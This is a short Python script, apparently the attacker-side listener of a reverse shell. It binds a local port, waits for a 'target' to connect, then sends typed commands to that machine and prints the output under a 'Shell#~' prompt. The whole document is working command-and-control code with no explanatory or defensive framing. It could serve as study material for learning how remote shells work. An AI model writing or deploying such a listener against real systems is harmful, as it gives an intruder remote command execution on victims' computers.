#!/usr/bin/python3
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1", 54321))
s.listen(5)
print("Listening for Incoming connections")
target, ip=s.accept()
print("target connected")
while True:
 message=input("* Shell#~%s: " % str(ip))
 target.send(message.encode())
 if message=='q':
  break
 else:
  answer=target.recv(1024).decode()
  print(answer)
s.close()
